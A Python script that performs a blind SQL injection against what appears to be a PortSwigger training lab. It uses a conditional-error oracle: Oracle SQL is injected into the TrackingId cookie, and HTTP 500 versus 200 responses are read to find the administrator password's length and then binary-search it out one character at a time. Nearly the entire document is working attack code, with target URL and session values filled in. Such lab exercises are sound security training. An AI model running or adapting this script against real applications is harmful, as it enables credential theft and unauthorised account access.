#!/usr/bin/env python3
"""
Blind SQL Injection - Conditional Error Oracle (PortSwigger lab)
Works for ALL printable keyboard characters (and optional Unicode mode).

Logic:
  HTTP 500 = condition TRUE   (error triggered on purpose)
  HTTP 200 = condition FALSE  (no error)
"""

import requests

# ==========================================
# CONFIGURATION
# ==========================================

URL         = "https://0a8a000a040987ca8084089b00780022.web-security-academy.net/"
TRACKING_ID = "LMK5UZjmEu9RgHBC"
SESSION_ID  = "SEy3v9EinEzYrvMBi3Cak3RGQnospycm"
USERNAME    = "administrator"
ERROR_STATUS = 500

# ---- Character coverage -------------------------------------------------
# "printable" : ASCII 32-126  -> every standard keyboard character
#               letters, digits, space, ~!@#$%^&*()_+-={}[]|\:";'<>?,./`
# "unicode"   : code points 32-65535 -> extended keyboard / special chars
CHARSET_MODE = "printable"      # or "unicode"

if CHARSET_MODE == "printable":
    CP_LOW, CP_HIGH = 32, 126     # covers ALL standard keyboard chars
else:
    CP_LOW, CP_HIGH = 32, 65535   # extended characters (slower per char)

# Cap the Unicode range if you KNOW the charset, e.g. Latin-1: CP_HIGH = 255
# CP_HIGH = 255


# ==========================================
# SEND REQUEST
# ==========================================

def send_payload(payload):
    cookies = {"TrackingId": payload, "session": SESSION_ID}
    return requests.get(URL, cookies=cookies, timeout=10)


# ==========================================
# TEST BOOLEAN CONDITION  (HTTP 500 = TRUE)
# ==========================================

def condition_is_true(condition):
    payload = (
        TRACKING_ID
        + "'||("
        + "SELECT CASE WHEN ("
        + condition
        + ") THEN TO_CHAR(1/0) ELSE '' END "
        + "FROM users WHERE username='"
        + USERNAME
        + "')||'"
    )
    response = send_payload(payload)
    is_true = response.status_code == ERROR_STATUS

    print(f"    Condition : {condition}")
    print(f"    HTTP      : {response.status_code}")
    print(f"    Result    : {'TRUE' if is_true else 'FALSE'}")
    return is_true


# ==========================================
# CHARACTER COMPARISON HELPER
# ==========================================

def char_at_position_is_gt(position, codepoint):
    """
    TRUE if SUBSTR(password, pos, 1) > CHR(codepoint).

    CHR() works for both ASCII and Unicode code points in Oracle,
    so this single expression covers every character on the keyboard
    (and beyond) without needing a charset string like
    'abcdefghijklmnopqrstuvwxyz0123456789'.
    """
    condition = f"SUBSTR(password,{position},1)>CHR({codepoint})"
    return condition_is_true(condition)


# ==========================================
# STEP 1 - CONFIRM SQL INJECTION
# ==========================================

print("=" * 60)
print("STEP 1 - Testing SQL Injection")
print("=" * 60)

print("""
We send:   1=1

TRUE  -> Oracle runs TO_CHAR(1/0) -> error -> HTTP 500
FALSE -> query completes normally -> HTTP 200
""")

if not condition_is_true("1=1"):
    print("\n[-] SQL injection test failed.")
    exit()
print("\n[+] SQL injection confirmed!\n")


# ==========================================
# STEP 2 - FIND PASSWORD LENGTH
# ==========================================

print("=" * 60)
print("STEP 2 - Finding Password Length")
print("=" * 60)

password_length = None
for length in range(1, 51):
    print(f"\n[*] Testing: Is password length > {length}?")
    if condition_is_true(f"LENGTH(password)>{length}"):
        print(f"    ---> YES. Password is longer than {length}")
    else:
        password_length = length
        print(f"    ---> NO. Password length is {length}")
        break

if password_length is None:
    print("\n[-] Password length not found.")
    exit()

print(f"\n[+] FINAL PASSWORD LENGTH = {password_length}\n")


# ==========================================
# STEP 3 - BINARY SEARCH EACH CHARACTER
# ==========================================

print("=" * 60)
print(f"STEP 3 - Extracting Password (binary search, range {CP_LOW}-{CP_HIGH})")
print("=" * 60)

password = ""

for position in range(1, password_length + 1):
    print("\n" + "-" * 60)
    print(f"POSITION {position} / {password_length}")
    print("-" * 60)

    low, high = CP_LOW, CP_HIGH

    # Binary search: find exact code point of this character.
    # Invariant: true value is in [low, high]
    while low < high:
        mid = (low + high) // 2
        print(f"[*] Range [{low}, {high}] | Testing > {mid}")

        if char_at_position_is_gt(position, mid):
            low = mid + 1          # char is strictly greater than mid
            print(f"    -> TRUE  | New range: [{low}, {high}]")
        else:
            high = mid             # char is <= mid
            print(f"    -> FALSE | New range: [{low}, {high}]")

    character = chr(low)
    password += character

    print("\n" + "*" * 60)
    print(f"[+] CHARACTER FOUND")
    print(f"[+] Position : {position}")
    print(f"[+] Codepoint: {low}")
    print(f"[+] Character: {repr(character)}")
    print(f"[+] Password : {password}")
    print("*" * 60)


# ==========================================
# FINAL RESULT
# ==========================================

print("\n" + "=" * 60)
print("PASSWORD EXTRACTION COMPLETE")
print("=" * 60)
print(f"\nUsername : {USERNAME}")
print(f"Password : {password}")
print(f"Length   : {len(password)}")
print("=" * 60)
